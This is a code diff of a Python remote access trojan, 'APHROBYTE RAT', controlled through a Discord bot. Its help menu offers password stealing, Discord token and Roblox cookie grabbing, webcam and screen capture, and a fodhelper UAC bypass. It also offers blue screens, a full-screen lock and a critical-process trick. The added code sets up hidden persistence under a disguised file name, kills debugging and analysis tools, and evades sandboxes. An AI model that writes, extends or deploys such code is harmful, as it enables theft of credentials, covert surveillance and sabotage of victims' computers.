@@ -1,10 +1,10 @@
-import pyautogui, cv2, time, discord, os, json, psutil, ctypes, rotatescreen as rs, win32api as win32, win32con, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil, base64,codecs,zlib
+import pyautogui, cv2, time, threading, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, win32api as win32, win32con, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil, base64,codecs,zlib
 from discord.ext import commands
 from urllib import request
 from ctypes import Structure, windll, c_uint, sizeof, byref
 from PIL import ImageTk,Image
 
-client = commands.Bot(command_prefix='^',intents=discord.Intents.all())
+client = commands.Bot(command_prefix='!',intents=discord.Intents.all())
 client.remove_command("help")
 
 ### CONFIGURATION
@@ -36,77 +36,77 @@ def admincheck():
 help_menu = f"""
 Available commands for **{os.getlogin()}** :
 
-**^help** - Shows this message
-**^startup** - Adds the file to startup.
-**^exit** - Stop the RAT from working.
-**^usagelist** - Returns a list of active users.
-**^admin_check** - Checks if you are admin on target computer.
-**^bypass_uac** - Attempts to bypass UAC to get admin privileges.
+**!help** - Shows this message
+**!startup** - Adds the file to startup.
+**!exit** - Stop the RAT from working.
+**!usagelist** - Returns a list of active users.
+**!admin_check** - Checks if you are admin on target computer.
+**!bypass_uac** - Attempts to bypass UAC to get admin privileges.
 
 `-----SURVEILLANCE-----`
 
-**^screenshot** - Sends a screenshot of the target machine
-**^idletime** - Displays for how long the user has been AFK
-**^webcam_capture** - Capture a picture of the webcam.
-**^tasklist** - Returns a list of active tasks.
+**!screenshot** - Sends a screenshot of the target machine
+**!idletime** - Displays for how long the user has been AFK
+**!webcam_capture** - Capture a picture of the webcam.
+**!tasklist** - Returns a list of active tasks.
 
 `-----FILE MANAGEMENT-----`
 
-**^chdir** - Changes the current directory. **^chdir <** to go back one directory.
-**^chdisk** - Changes the current disk. (E, C, D, etc.)
-**^ls** - Displays all items in the current directory.
-**^download** - Downloads a file from the specified path.
-**^upload** - Uploads a file to the specified path.
-**^taskkill** - Kills the specified task.
-**^startfile** - Starts a file.
-**^delfile** - Deletes a file.
-**^hidefile** \ **^unhidefile** - Hides/unhides a file.
+**!chdir** - Changes the current directory. **!chdir <** to go back one directory.
+**!chdisk** - Changes the current disk. (E, C, D, etc.)
+**!ls** - Displays all items in the current directory.
+**!download** - Downloads a file from the specified path.
+**!upload** - Uploads a file to the specified path.
+**!taskkill** - Kills the specified task.
+**!startfile** - Starts a file.
+**!delfile** - Deletes a file.
+**!hidefile** \ **!unhidefile** - Hides/unhides a file.
 
 `-----INFORMATION GATHERING-----`
 
-**^whois** - Prints the user"s name
-**^getip** - Gets the current user's IP address
-**^clipboard** - Returns a string of the user's clipboard.
-**^stealpasswords** - Steal all the passwords from the device.
-**^grabroblox** - Grabs the user's Roblox account cookie.
-**^hardware_list** - Lists the user's hardware on newlines.
+**!whois** - Prints the user"s name
+**!getip** - Gets the current user's IP address
+**!clipboard** - Returns a string of the user's clipboard.
+**!stealpasswords** - Steal all the passwords from the device.
+**!grabroblox** - Grabs the user's Roblox account cookie.
+**!hardware_list** - Lists the user's hardware on newlines.
 """
 
 help_menu2 = """
-**^grabdiscord** - Fetches the user's Discord account token.
+**!grabdiscord** - Fetches the user's Discord account token.
 
 `-----SANCTIONING-----`
 
-**^bsod** - Blue screens the computer.
-**^disabletaskmgr** \ **^enabletaskmanager** - Disable/enable task manager.
-**^logoff** - Logs the user off.
-**^shutdown** - Shuts the user's PC off.
-**^restart** - Restarts the user's PC.
-**^blockscreen** - Blocks the user's screen. (ATTENTION : IRREVERSIBLE)
-**^critproc** - Makes the RAT a critical process, meaning if it's task killed the user will get a BSOD.
-**^screenflip** - Rotates the user's screen 90 degrees.
+**!bsod** - Blue screens the computer.
+**!disabletaskmgr** \ **!enabletaskmanager** - Disable/enable task manager.
+**!logoff** - Logs the user off.
+**!shutdown** - Shuts the user's PC off.
+**!restart** - Restarts the user's PC.
+**!blockscreen** - Blocks the user's screen. (IRREVERSIBLE UNTIL USER RESTARTS)
+**!critproc** - Makes the RAT a critical process, meaning if it's task killed the user will get a BSOD.
+**!screenflip** - Rotates the user's screen 90 degrees.
 
 `-----FUN-----`
 
-**^write** - Writes a sentence then presses enter.
-**^setclipboard** - Sets the clipboard to the specified string of text.
-**^forcedesktop** - Sends the user on desktop automatically.
-**^messmouse** - Shakes the user's cursor when they try to move the mouse.
-**^opensite** - Opens a site on the user's browser.
-**^key_press** - Press a key.
-**^showtaskbar** \ **^hidetaskbar**
+**!write** - Writes a sentence then presses enter.
+**!setclipboard** - Sets the clipboard to the specified string of text.
+**!forcedesktop** - Sends the user on desktop automatically.
+**!messmouse** - Shakes the user's cursor when they try to move the mouse, run this command again to stop.
+**!opensite** - Opens a site on the user's browser.
+**!key_press** - Press a key.
+**!showtaskbar** \ **!hidetaskbar**
 
 `-----COMMUNICATION-----`
 
-**^questionmsg** - Sends the user a question message.
-**^warningmsg** - Sends the user a warning message.
-**^errormsg** - Sends the user an error message.
-**^infomsg** - Sends the user an informative message.
+**!questionmsg** - Sends the user a question message.
+**!warningmsg** - Sends the user a warning message.
+**!errormsg** - Sends the user an error message.
+**!infomsg** - Sends the user an informative message.
 
 ```* You need to specify the usage ID after every command. Arguments come after.
 
-Example : ^write (usage-id) (sentence) => ^write 123456 Test sentence
-          ^questionmsg (usage-id) (message) => ^questionmsg 123456 Test Message
+Example : !write (usage-id) (sentence) => !write 123456 Test sentence
+          !questionmsg (usage-id) (message) => !questionmsg 123456 Test Message
 ```
 """
 
@@ -207,8 +207,8 @@ async def on_ready():
 
 ``` APHROBYTE RAT v1.9.1 | {client.user.name} | RIOT ADMINISTRATION ```
 
-Help menu : **^help ||{clientid}||**
-Get list of active users : **^usagelist**
+Help menu : **!help ||{clientid}||**
+Get list of active users : **!usagelist**
 
 RAT installed in : `{installationpath}`
 
@@ -424,29 +424,45 @@ async def webcam_capture(ctx, *, usid):
         if cam_number == 0:
             await ctx.send(f"**{os.getlogin()}** has no webcam available.")
     
+def on_closing():
+    pass
+
+def screenblock():
+    box = tk.Tk()
+    box.attributes('-fullscreen', True)
+    box.attributes("-topmost", True)
+    box.configure(background='black')
+    box.protocol("WM_DELETE_WINDOW", on_closing)
+    box.mainloop()
+
 @client.command()
 async def blockscreen(ctx, *, usid):
     if usid == clientid:
+        threading.Thread(target=screenblock, daemon=True).start()
         await ctx.send(f"**{os.getlogin()}**'s screen has been blocked.")
-        box = tk.Tk()
-        def on_closing():
-            pass
-        box.attributes('-fullscreen', True)
-        box.attributes("-topmost", True)
-        box.configure(background='black')
-        box.protocol("WM_DELETE_WINDOW", on_closing)
-        box.mainloop()
         
+
+mousemess = False
+
+def StartMouseMess():
+    global mousemess
+    while mousemess:
+        x=random.randint(600, 700)
+        y=random.randint(600, 700)
+        pyautogui.moveTo(x, y, 3)
+        time.sleep(1)
+
 @client.command()
 async def messmouse(ctx, *, usid):
     if usid == clientid:
-        await ctx.send(f"Started messing **{os.getlogin()}**'s mouse (takes a while) you cannot use the bot on this user during the process.")
-        for i in range(5):
-            x=random.randint(600, 700)
-            y=random.randint(600, 700)
-            pyautogui.moveTo(x, y, 3)
-            time.sleep(1)
-        await ctx.send(f"Finished mouse messing **{os.getlogin()}**")
+        global mousemess
+        if mousemess == False:
+            mousemess = True
+            threading.Thread(target=StartMouseMess,daemon=True).start()
+            await ctx.send(f"Started messing **{os.getlogin()}**'s mouse.")
+        elif mousemess == True:
+            mousemess = False
+            await ctx.send(f"Stopped messing **{os.getlogin()}**'s mouse.")
         
 
 @client.command()
@@ -774,7 +790,6 @@ async def bypass_uac(ctx, *, usid):
                 os.system(create_payload_reg_key)
             with disable_fsr():
                 os.system("fodhelper.exe")  
-            time.sleep(2)
             remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
             os.system(remove_reg)
 
@@ -812,7 +827,6 @@ async def taskkill(ctx, usid, *, proc):
     if usid == clientid:
         kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f" 
         os.system(kilproc)
-        time.sleep(2)
         process_name = proc
         call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
         output = subprocess.check_output(call).decode()
@@ -933,5 +947,50 @@ async def showtaskbar(ctx, *, usid):
             ctypes.windll.user32.ShowWindow(h, 9)
             await ctx.send(f"**{os.getlogin()}**'s taskbar has been returned.")
         except: await ctx.send(f"**{os.getlogin()}**'s taskbar couldn't be returned.")
+
+def mainfunc():
+    bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
+    bltask = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')
+
+    if sys.argv[0].endswith("exe"):
+        backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows HD Visual Drivers.exe"
+        if not os.path.exists(backdoor_location):
+            shutil.copyfile(sys.executable, backdoor_location)
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            command = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v visuals /t REG_SZ /d "' + backdoor_location + '" /f'
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "visuals", 0, winreg.REG_SZ, command)
+            winreg.CloseKey(key)
+            subprocess.call(command, shell=True)
+            p = os.popen('attrib +h "' + backdoor_location + '"')
+            t = p.read()
+            p.close()
+    
+    result = subprocess.getoutput("tasklist")
+    numb = len(result)
+    if numb > 0:
+        temp = (os.getenv('TEMP'))
+        if os.path.isfile(temp + r"\olist.txt"):
+            os.system(r"del %temp%\olist.txt /f")
+        f1 = open(temp + r"\olist.txt", 'a')
+        f1.write(result)
+        f1.close()
+        final = ""
+        with open(f"{os.getenv('TEMP')}\olist.txt") as A:
+            final = A.read().lower()
+        for task in bltask:
+            if task in final:
+                try:
+                    kilproc = r"taskkill /IM" + ' "' + task + '.exe' + '" ' + r"/f" 
+                    os.system(kilproc)
+                except: sys.exit(0)
+
+    os.remove(f"{temp}\olist.txt")
+
+    if f"{os.getlogin()}".lower() in bluser:
+        sys.exit(0)
+
+if __name__ == '__main__':
+    mainfunc()
 
 client.run(token)
